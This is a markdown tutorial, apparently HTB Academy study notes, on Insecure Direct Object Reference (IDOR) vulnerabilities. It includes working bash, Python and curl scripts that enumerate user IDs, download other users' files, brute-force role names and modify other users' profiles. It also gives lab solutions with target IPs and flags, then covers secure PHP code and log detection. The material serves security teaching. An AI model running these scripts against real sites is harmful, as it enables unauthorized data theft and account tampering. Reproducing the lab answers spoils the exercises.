# Insecure Direct Object References (IDOR)

> **🎯 Authorization Bypass:** Accessing data that should not be accessible by manipulating object references

## Overview

IDOR is among the most common web vulnerabilities that can lead to accessing data that should not be accessible by attackers. The vulnerability occurs due to the lack of a solid access control system on the back-end, where applications use sequential numbers or user IDs to identify items without proper authorization checks.

**IDOR Types:**
- **Static File IDOR** - Direct file access with predictable names
- **Parameter-based IDOR** - URL parameters with object references  
- **Encoded/Hashed IDOR** - Obfuscated but reversible references
- **Function-based IDOR** - AJAX calls and API endpoints

---

## 1. Identifying IDORs

### URL Parameters & APIs

**Look for Direct Object References in:**
- URL parameters: `?uid=1`, `?filename=file_1.pdf`, `?id=123`
- API endpoints: `/api/users/1`, `/api/documents/456`
- HTTP headers: Cookies, custom headers with IDs
- JSON/XML data: User IDs, file references, resource identifiers

### Basic Testing Methodology

**Step 1: Identify Object References**
```bash
# Look for sequential numbers or identifiers
http://target.com/profile.php?uid=1
http://target.com/documents.php?file_id=123
http://target.com/api/users/456
```

**Step 2: Test Incremental Values**
```bash
# Try incrementing/decrementing values
?uid=2, ?uid=3, ?uid=0
?file_id=124, ?file_id=122
```

**Step 3: Automated Fuzzing**
```bash
# Use tools for mass enumeration
ffuf -u "http://target.com/profile.php?uid=FUZZ" -w <(seq 1 1000)
wfuzz -c -z range,1-1000 "http://target.com/api/users/FUZZ"
```

### AJAX Calls Discovery

**JavaScript Source Code Analysis:**
```javascript
// Look for unused admin functions in frontend code
function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post", 
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success: function(result){
            // Admin function available to all users
        }
    });
}
```

**Browser DevTools Discovery:**
1. **Sources Tab** - Search for `.ajax(`, `fetch(`, `XMLHttpRequest`
2. **Network Tab** - Monitor all API calls during usage
3. **Console Tab** - List available JavaScript functions

### Understanding Hashing/Encoding

#### Base64 Encoded References
```bash
# Identify base64 patterns (A-Z, a-z, 0-9, +, /, =)
?filename=ZmlsZV8xMjMucGRm

# Decode to see original reference
echo "ZmlsZV8xMjMucGRm" | base64 -d
# Output: file_123.pdf

# Encode different file and test access
echo -n "file_124.pdf" | base64
# Output: ZmlsZV8xMjQucGRm
```

#### MD5 Hashed References
```bash
# Hash patterns (32 hex characters)
?filename=c81e728d9d4c2f636f067f89cc14862c

# Try common hashing inputs
echo -n "file_1.pdf" | md5sum
echo -n "1" | md5sum
echo -n "user1" | md5sum
```

#### JavaScript Hash Calculation
```javascript
// Frontend hash calculation (exploitable)
$.ajax({
    url: "download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success: function(result){
        // Hash calculation exposed in frontend
    }
});
```

### Compare User Roles

**Multi-User Testing Strategy:**
1. **Register multiple test accounts** with different privilege levels
2. **Monitor API calls** for each user role
3. **Compare object references** and access patterns
4. **Test cross-user access** with discovered parameters

**Example API Call Analysis:**
```json
// User1 API call (high privilege)
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"  
  },
  "Id": "1",
  "Name": "User1"
}

// Test same call as User2 (should be denied but may work)
```

---

## 2. Mass IDOR Enumeration

### Attack Scenario: Employee Manager

**Application Setup:**
```
Employee Manager Web Application
├── /documents.php?uid=1  ← Document access
├── /contracts.php        ← Contract downloads  
└── /profile.php?uid=1    ← Profile information
```

### Insecure Parameters Exploitation

#### Static File IDOR
**Predictable File Naming:**
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

Pattern: /documents/{Type}_{UID}_{Month}_{Year}.pdf
```

**Manual Testing:**
```bash
# Test different user files
curl http://target.com/documents/Invoice_2_09_2021.pdf
curl http://target.com/documents/Report_3_10_2021.pdf
```

#### Parameter-Based IDOR  
**URL Parameter Manipulation:**
```bash
# Original request
http://target.com/documents.php?uid=1

# Test other users
http://target.com/documents.php?uid=2
http://target.com/documents.php?uid=3
```

**Key Indicators:**
- Different file links in HTML source
- Changed file names/dates in responses
- Access to unauthorized data

### Mass Enumeration Techniques

#### Method 1: Bash Script Automation
```bash
#!/bin/bash
# IDOR mass enumeration script

url="http://target.com"

for i in {1..20}; do
    echo "Testing UID: $i"
    
    # Extract document links for each user
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?\.pdf"); do
        echo "Found: $link"
        wget -q $url/$link
    done
done
```

#### Method 2: Burp Suite Intruder
**Setup:**
1. Send request to Intruder: `GET /documents.php?uid=1`
2. Set payload position on UID value: `?uid=§1§`
3. Payload type: Numbers (1-100)
4. Start attack and analyze responses

#### Method 3: Python Script
```python
#!/usr/bin/env python3
import requests
import re

base_url = "http://target.com"

for uid in range(1, 21):
    response = requests.get(f"{base_url}/documents.php?uid={uid}")
    
    # Extract document links
    links = re.findall(r'/documents/.*?\.pdf', response.text)
    
    for link in links:
        print(f"UID {uid}: {link}")
        
        # Download file
        file_response = requests.get(f"{base_url}{link}")
        filename = link.split('/')[-1]
        
        with open(f"uid_{uid}_{filename}", 'wb') as f:
            f.write(file_response.content)
```

---

## 3. Bypassing Encoded References

### Function Disclosure Attack

#### JavaScript Function Analysis
**Vulnerable Frontend Code:**
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

**Hash Calculation Process:**
1. **Input:** `uid = "1"`
2. **Base64 Encode:** `btoa("1")` = `"MQ=="`
3. **MD5 Hash:** `CryptoJS.MD5("MQ==")` = `"cdd96d3cc73d1dbdaffa03cc6cd7339b"`

#### Reverse Engineering Process
```bash
# Step 1: Identify the encoding/hashing method
echo -n "1" | base64 -w 0 | md5sum
# Output: cdd96d3cc73d1dbdaffa03cc6cd7339b

# Step 2: Verify against captured request
# POST /download.php
# contract=cdd96d3cc73d1dbdaffa03cc6cd7339b ✓ Match!
```

### Mass Contract Enumeration

#### Hash Calculation for Multiple Users
```bash
# Generate hashes for users 1-20
for i in {1..20}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    echo "UID $i: $hash"
done
```

#### Automated Download Script
```bash
#!/bin/bash

url="http://target.com"

for i in {1..20}; do
    # Calculate hash: base64(uid) -> md5
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    
    # Download contract using calculated hash
    curl -sOJ -X POST -d "contract=$hash" "$url/download.php"
    
    echo "Downloaded contract for UID $i (hash: $hash)"
done
```

---

## 4. IDOR in Insecure APIs

### Function Calls vs Information Disclosure

**Two IDOR Attack Types:**
- **Information Disclosure** - Read files/data belonging to other users
- **Insecure Function Calls** - Execute API functions as other users

**API IDOR Capabilities:**
- Change other users' private information
- Reset other users' passwords  
- Buy items using other users' payment information
- Privilege escalation through role manipulation
- User account takeover

### Attack Scenario: Profile API Exploitation

**Application Structure:**
```
Employee Manager Profile API
├── GET /profile/api.php/profile/{uid}     ← Read user details
├── PUT /profile/api.php/profile/{uid}     ← Update user details  
├── POST /profile/api.php/profile/{uid}    ← Create new user
└── DELETE /profile/api.php/profile/{uid}  ← Delete user
```

### Identifying Insecure APIs

#### API Request Analysis
**Original Profile Update Request:**
```http
PUT /profile/api.php/profile/1 HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: role=employee

{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2", 
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

#### Vulnerable Parameter Discovery
**Hidden JSON Parameters:**
- `uid` - User identifier (potential target change)
- `uuid` - User unique identifier (access control check)
- `role` - Privilege level (privilege escalation target)
- Client-side access control via `Cookie: role=employee`

### Exploitation Techniques

#### Attack 1: User Account Takeover
**Attempt to change UID:**
```http
PUT /profile/api.php/profile/2 HTTP/1.1
Content-Type: application/json

{
    "uid": 2,  # Changed to target user
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee", 
    "full_name": "Attacker Name",
    "email": "attacker@evil.com"
}
```

**Response:** `uid mismatch` - API validates UID against endpoint

#### Attack 2: Cross-User Data Modification
**Attempt to modify other user's details:**
```http
PUT /profile/api.php/profile/2 HTTP/1.1
Content-Type: application/json

{
    "uid": 2,  # Match endpoint UID
    "uuid": "40f5888b67c748df7efba008e7c2f9d2", # Our UUID
    "role": "employee",
    "full_name": "Modified Name"
}
```

**Response:** `uuid mismatch` - API validates UUID ownership

#### Attack 3: User Creation (Admin Privilege Required)
**Attempt to create new user:**
```http
POST /profile/api.php/profile/999 HTTP/1.1
Content-Type: application/json

{
    "uid": 999,
    "uuid": "new-uuid-value", 
    "role": "employee",
    "full_name": "New User"
}
```

**Response:** `Creating new employees is for admins only`

#### Attack 4: Privilege Escalation
**Attempt role elevation:**
```http
PUT /profile/api.php/profile/1 HTTP/1.1
Content-Type: application/json

{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "admin",  # Privilege escalation attempt
    "full_name": "Amy Lindon"
}
```

**Response:** `Invalid role` - Unknown role name

### Information Disclosure for API Exploitation

#### GET Request IDOR Testing
**Enumerate user details via GET:**
```bash
# Test API information disclosure
curl -H "Cookie: role=employee" \
     "http://target.com/profile/api.php/profile/1"

# Test other users
curl -H "Cookie: role=employee" \
     "http://target.com/profile/api.php/profile/2"

curl -H "Cookie: role=employee" \
     "http://target.com/profile/api.php/profile/5"
```

#### Exploitation Chain Strategy
**Multi-step IDOR Attack:**
1. **Information Disclosure** - GET other users' `uuid` values
2. **Function Call Exploitation** - Use discovered `uuid` to modify their data
3. **Privilege Escalation** - Discover valid admin role names
4. **Account Takeover** - Complete compromise

### Advanced API IDOR Techniques

#### Method 1: Batch User Enumeration
```bash
#!/bin/bash
# Enumerate all users and extract UUIDs

for i in {1..50}; do
    response=$(curl -s -H "Cookie: role=employee" \
                    "http://target.com/profile/api.php/profile/$i")
    
    if [[ $response != *"error"* ]]; then
        echo "User $i found:"
        echo $response | jq .
        
        # Extract UUID for later exploitation
        uuid=$(echo $response | jq -r '.uuid')
        echo "UID: $i, UUID: $uuid" >> user_database.txt
    fi
done
```

#### Method 2: Role Enumeration
```bash
# Common role names to test
roles=("admin" "administrator" "manager" "supervisor" "hr" "finance" "root")

for role in "${roles[@]}"; do
    echo "Testing role: $role"
    
    response=$(curl -s -X PUT \
                    -H "Content-Type: application/json" \
                    -H "Cookie: role=employee" \
                    -d "{\"uid\":1,\"uuid\":\"your-uuid\",\"role\":\"$role\"}" \
                    "http://target.com/profile/api.php/profile/1")
    
    if [[ $response != *"Invalid role"* ]]; then
        echo "Valid role found: $role"
        echo $response
    fi
done
```

#### Method 3: Cross-User Exploitation
```bash
# Once UUIDs are discovered, attempt cross-user modification
target_uid=5
target_uuid="discovered-uuid-for-user-5"

curl -X PUT \
     -H "Content-Type: application/json" \
     -H "Cookie: role=employee" \
     -d "{
         \"uid\": $target_uid,
         \"uuid\": \"$target_uuid\", 
         \"role\": \"employee\",
         \"full_name\": \"Pwned User\",
         \"email\": \"pwned@attacker.com\"
     }" \
     "http://target.com/profile/api.php/profile/$target_uid"
```

### Burp Suite API Testing

#### Intruder Setup for User Enumeration
**Request Template:**
```http
GET /profile/api.php/profile/§1§ HTTP/1.1
Host: target.com
Cookie: role=employee
```

**Payload Configuration:**
- Payload type: Numbers
- Range: 1-100
- Filter responses by status code and content length

#### Repeater for Parameter Testing
**JSON Parameter Fuzzing:**
```json
{
    "uid": §1§,
    "uuid": "§uuid§", 
    "role": "§role§",
    "full_name": "Test",
    "email": "test@test.com"
}
```

---

## HTB Academy Lab Solutions

### Lab 1: Mass Document Enumeration

**Target:** `http://94.237.60.55:37765`

**Objective:** Find flag in documents from first 20 users

**Solution:**
```bash
#!/bin/bash
url="http://94.237.60.55:37765"

for i in {1..20}; do
    # Get document links for each user
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?\.(pdf|txt)"); do
        wget -q $url/$link
    done
done

# Find the .txt file with flag
ls -la *.txt
cat *.txt
```

**🎯 Flag:** `HTB{4ll_f1l35_4r3_m1n3}`

### Lab 2: Encoded Contract Bypass

**Target:** `http://94.237.54.192:58374`

**Objective:** Download contracts from first 20 employees using hash bypass

**Solution Method 1: Calculate contract parameter**
```bash
#!/bin/bash
url="http://94.237.54.192:58374"

for i in {1..20}; do
    # Calculate: base64(uid) -> md5  
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" "$url/download.php"
done

# Find non-empty file with flag
ls -lAS contract_*
cat contract_*.pdf | grep HTB
```

**Solution Method 2: Calculate filename directly**
```bash
#!/bin/bash
url="http://94.237.54.192:58374"

for i in {1..20}; do
    # Direct filename calculation
    hash=$(echo -n $i | base64 -w 0)
    curl -sOJ "$url/download.php?contract=$hash"
done
```

**🎯 Flag:** `HTB{h45h1n6_1d5_w0n7_570p_m3}`

### Lab 3: API Information Disclosure

**Target:** `http://94.237.54.192:58374`

**Objective:** Read details of user with `uid=5` and find their `uuid` value

**Solution:**
```bash
# Test API information disclosure
curl -H "Cookie: role=employee" \
     "http://94.237.54.192:58374/profile/api.php/profile/5"

# Alternative with verbose output
curl -v -H "Cookie: role=employee" \
       "http://94.237.54.192:58374/profile/api.php/profile/5"
```

**Expected Response:**
```json
{
    "uid": 5,
    "uuid": "[UUID_VALUE]",
    "role": "employee", 
    "full_name": "[NAME]",
    "email": "[EMAIL]",
    "about": "[DESCRIPTION]"
}
```

**Automated UUID Extraction:**
```bash
# Extract just the UUID value
curl -s -H "Cookie: role=employee" \
     "http://94.237.54.192:58374/profile/api.php/profile/5" | \
     jq -r '.uuid'

# Or with grep if jq not available
curl -s -H "Cookie: role=employee" \
     "http://94.237.54.192:58374/profile/api.php/profile/5" | \
     grep -oP '"uuid":\s*"\K[^"]*'
```

---

## Advanced IDOR Techniques

### API Parameter Discovery

**Hidden Parameter Testing:**
```bash
# Test common parameter names
curl "http://target.com/api/user?id=1"
curl "http://target.com/api/user?user_id=1"  
curl "http://target.com/api/user?uid=1"
curl "http://target.com/api/user?userid=1"
```

### UUID and GUID Bypass

**Predictable UUID Patterns:**
```bash
# Sequential UUIDs (sometimes predictable)
user1: 00000000-0000-0000-0000-000000000001
user2: 00000000-0000-0000-0000-000000000002

# Time-based UUIDs (can be calculated)
user_created_at_time_X: uuid_for_time_X
```

### Session-Based IDOR

**Cookie Manipulation:**
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: user_id=1; session=abc123

# Try different user_id values
Cookie: user_id=2; session=abc123
```

---

## Vulnerable Code Examples

### PHP - Insecure Direct Access
```php
<?php
// Vulnerable: No authorization check
$uid = $_GET['uid'];
$query = "SELECT * FROM documents WHERE user_id = " . $uid;
$result = mysqli_query($connection, $query);

// Displays all documents for any user ID
while ($row = mysqli_fetch_array($result)) {
    echo "<a href='/documents/" . $row['filename'] . "'>" . $row['title'] . "</a>";
}
?>
```

### Secure Implementation
```php
<?php
// Secure: Verify user ownership
session_start();
$uid = $_GET['uid'];
$current_user = $_SESSION['user_id'];

// Check if user can access this data
if ($uid != $current_user && !is_admin($current_user)) {
    die("Access denied");
}

// Additional access control
$query = "SELECT * FROM documents WHERE user_id = ? AND (user_id = ? OR ? = 1)";
$stmt = $pdo->prepare($query);
$stmt->execute([$uid, $current_user, is_admin($current_user)]);
?>
```

### API - Insecure Access Control
```php
<?php
// Vulnerable: Client-side role validation only
$input = json_decode(file_get_contents('php://input'), true);
$role = $_COOKIE['role']; // Client-controlled

// Dangerous: No server-side authorization check
if ($_SERVER['REQUEST_METHOD'] == 'PUT') {
    $uid = $input['uid'];
    $uuid = $input['uuid']; 
    $new_role = $input['role'];
    
    // Weak validation - UUID not verified against user
    if ($uuid == get_user_uuid($uid)) {
        update_user_profile($uid, $input);
    }
}

// Admin functions only check client-side role
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $role == 'admin') {
    create_user($input); // Bypassed if role cookie modified
}
?>
```

### API - Secure Implementation  
```php
<?php
// Secure: Server-side session validation
session_start();
$current_user_id = $_SESSION['user_id'];
$current_user_role = get_user_role_from_db($current_user_id);

$input = json_decode(file_get_contents('php://input'), true);
$target_uid = $input['uid'];

// Verify user can modify this profile
function can_modify_profile($current_id, $target_id, $role) {
    // Users can only modify their own profile
    if ($current_id == $target_id) return true;
    
    // Admins can modify any profile
    if ($role == 'admin') return true;
    
    return false;
}

if ($_SERVER['REQUEST_METHOD'] == 'PUT') {
    if (!can_modify_profile($current_user_id, $target_uid, $current_user_role)) {
        http_response_code(403);
        die(json_encode(['error' => 'Access denied']));
    }
    
    // Prevent privilege escalation
    if (isset($input['role']) && $input['role'] != get_user_role_from_db($target_uid)) {
        if ($current_user_role != 'admin') {
            http_response_code(403);
            die(json_encode(['error' => 'Cannot change role']));
        }
    }
    
    update_user_profile($target_uid, $input);
}

// Admin-only functions with proper validation
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if ($current_user_role != 'admin') {
        http_response_code(403);
        die(json_encode(['error' => 'Admin access required']));
    }
    create_user($input);
}
?>
```

---

## Prevention & Hardening

### Access Control Implementation

**Rule-Based Access Control:**
```php
function can_access_user_data($current_user_id, $target_user_id) {
    // Users can only access their own data
    if ($current_user_id == $target_user_id) return true;
    
    // Admins can access all data
    if (is_admin($current_user_id)) return true;
    
    // Managers can access their team data
    if (is_manager($current_user_id) && 
        is_team_member($target_user_id, $current_user_id)) {
        return true;
    }
    
    return false;
}
```

### Indirect Object References

**Secure Object Reference Design:**
```php
// Instead of direct user IDs
// OLD: /profile.php?uid=123

// Use session-based access
// NEW: /profile.php (get uid from session)

// Or use mapping tables
$mapping = [
    'abc123' => 1,  // Random token maps to user ID
    'def456' => 2,
];
$uid = $mapping[$_GET['token']];
```

---

## Detection & Monitoring

### Log Analysis
```bash
# Monitor for IDOR attempts
grep -E "uid=|user_id=|id=" /var/log/apache2/access.log | \
grep -E "[?&](uid|user_id|id)=[0-9]+" | \
sort | uniq -c | sort -nr

# Look for rapid sequential requests
awk '{print $1, $7}' /var/log/apache2/access.log | \
grep -E "uid=[0-9]+" | sort | uniq -c | sort -nr
```

### Security Testing Checklist
- [ ] Test all URL parameters with different values
- [ ] Analyze JavaScript code for hidden API calls  
- [ ] Check file naming patterns for predictability
- [ ] Test encoded/hashed parameters for reversibility
- [ ] Verify authorization on all data access points
- [ ] Monitor for mass enumeration attempts

---

*IDOR vulnerabilities highlight the critical importance of proper authorization checks and secure access control design in web applications.* 